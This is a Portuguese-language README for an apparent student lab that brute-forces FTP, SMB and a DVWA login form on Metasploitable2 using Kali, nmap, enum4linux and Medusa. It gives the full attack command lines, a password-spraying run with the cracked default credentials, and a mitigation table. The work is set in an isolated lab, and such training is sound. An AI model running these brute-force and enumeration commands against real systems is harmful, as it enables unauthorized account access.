# Brute Force Lab — Medusa + Metasploitable2 + DVWA

Projeto prático de simulação de ataques de força bruta em ambiente controlado, utilizando **Kali Linux** e **Medusa** contra serviços vulneráveis do **Metasploitable2** e do **DVWA (Damn Vulnerable Web App)**.

> Projeto feito **exclusivamente em laboratório isolado (rede host-only)**, para fins educacionais. Nenhuma técnica aqui deve ser aplicada contra sistemas sem autorização explícita.

## Objetivo

Compreender e demonstrar na prática ataques de força bruta em diferentes serviços (FTP, SMB, formulário web), utilizando o Kali Linux e a ferramenta Medusa, e propor medidas de mitigação para cada vulnerabilidade explorada.

## Ambiente de Laboratório

| Máquina | IP | Função |
|---|---|---|
| Kali Linux | 10.0.2.15 | Atacante |
| Metasploitable2 | 10.0.2.3 | Alvo vulnerável |

Rede configurada em modo **Host-only** no VirtualBox, isolando o laboratório da rede externa.

## Reconhecimento (Nmap)

```bash
nmap -sV -p- 10.0.2.3
```

Principais portas relevantes para o teste:

```
21/tcp    open  ftp         vsftpd 2.3.4
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)   → DVWA
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

## Construção das Wordlists

Para equilibrar realismo e tempo de execução, foram criadas duas wordlists próprias (`lowusers.txt` e `lowsenhas.txt`), combinando:

1. Uma amostra reduzida (100-200 linhas) de uma wordlist pública de domínio aberto ([duyet/bruteforce-database](https://github.com/duyet/bruteforce-database))
2. Credenciais padrão conhecidas e publicamente documentadas do Metasploitable2 (ex: `msfadmin`, `user`, `postgres`, `service`), inseridas no meio do arquivo (não apenas no início/fim)
3. Remoção de duplicatas mantendo a ordem original (`awk '!seen[$0]++'`)

```bash
head -n 150 <wordlist-origem> > senhas-amostra.txt
split -n l/2 senhas-amostra.txt parte_
cat parte_aa <(echo -e "msfadmin\nuser\npostgres\nservice\n123456\npassword") parte_ab > lowsenhas.txt
awk '!seen[$0]++' lowsenhas.txt > lowsenhas-final.txt
```

Resultado: `lowusers.txt` (54 entradas) e `lowsenhas.txt` (156 entradas).

## Ataque 1 — FTP (Medusa)

```bash
medusa -h 10.0.2.3 -U lowusers.txt -P lowsenhas.txt -M ftp -t 10
```

**Resultado:** _[preencher com o ACCOUNT FOUND do seu log]_

**Validação manual:**
```bash
ftp 10.0.2.3
```

## Ataque 2 — SMB (Enumeração + Password Spraying)

### Enumeração de usuários (null session)

```bash
enum4linux -U 10.0.2.3
```

A Samba do alvo permitiu **sessão nula** (`username ''`, `password ''`), expondo a lista completa de usuários do sistema sem autenticação — uma falha de configuração relevante.

```bash
grep "user:\[" enum4linux-output.txt | awk -F'[][]' '{print $2}' > smb-users.txt
```

### Password Spraying

Com a lista real de usuários extraída, aplicou-se **password spraying** (poucas senhas comuns testadas contra todos os usuários, ao invés de muitas senhas por usuário — abordagem que reduz o risco de lockout de conta):

```bash
medusa -h 10.0.2.3 -U smb-users.txt -P smb-passwords-spray.txt -M smbnt
```

**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: user Password: user [SUCCESS (ADMIN$ - Access Allowed)]
ACCOUNT FOUND: [smbnt] Host: 10.0.2.3 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

**Validação manual:**
```bash
smbclient //10.0.2.3/ADMIN$ -U msfadmin
```
Login confirmado com sucesso.

## Ataque 3 — DVWA (Login Web)

### Reconhecimento do formulário

```bash
curl -s http://10.0.2.3/dvwa/login.php
```

Campos identificados: `username`, `password`, botão `Login`. Sem token CSRF (`user_token`) presente no formulário — o que, em tese, simplifica o ataque automatizado.

Observação adicional: a própria tela de login expõe a dica **"default username is 'admin' with password 'password'"**, uma informação sensível desnecessariamente exposta.

### Tentativa com Medusa (módulo web-form)

```bash
medusa -h 10.0.2.3 -u admin -P lowsenhas.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=&password=&Login=Login" \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=<valor>; security=high"
```

### Limitação encontrada

O ataque retornou consistentemente **erro HTTP 302** (redirecionamento) em vez de processar o login. Causa provável: o Medusa reutiliza um único cookie de sessão estático durante todas as tentativas, mas o DVWA valida o nível de segurança (`security`) a partir do que está armazenado no banco de dados da aplicação, não apenas do cookie enviado — gerando descompasso entre o estado esperado pelo servidor e o cookie fixo fornecido pela ferramenta.

Essa limitação é consistente com uma característica conhecida do Medusa: o módulo `web-form` não gerencia sessão dinamicamente (diferente de ferramentas como o Hydra ou Burp Suite Intruder), o que o torna menos adequado para aplicações web modernas dependentes de estado de sessão.

**Conclusão:** o ataque foi corretamente modelado e configurado (formulário, campos e sinal de falha identificados corretamente), mas esbarrou em uma limitação técnica da ferramenta diante do gerenciamento de sessão do DVWA — um achado relevante sobre os limites práticos do Medusa em comparação a outras ferramentas de força bruta web.

## Recomendações de Mitigação

| Vulnerabilidade | Recomendação |
|---|---|
| FTP com credenciais fracas/padrão | Desabilitar logins padrão, aplicar política de senha forte, usar SFTP/FTPS |
| Samba permitindo sessão nula | Desabilitar null session (`restrict anonymous = 2`), aplicar auditoria de enumeração |
| Senhas reutilizadas/fracas no SMB | Política de senha forte, MFA, bloqueio de conta após tentativas falhas |
| Credenciais padrão expostas na tela de login do DVWA | Remover dicas de credenciais em produção, implementar rate limiting e CAPTCHA |
| Falta de lockout de conta em geral | Implementar bloqueio temporário após N tentativas falhas, monitoramento via SIEM/IDS |

## Evidências

Ver pasta [`/images`](./images) — prints dos comandos, outputs do Medusa e validações manuais.

## Aprendizados

_[espaço para suas reflexões pessoais sobre o processo, dificuldades e o que aprendeu]_
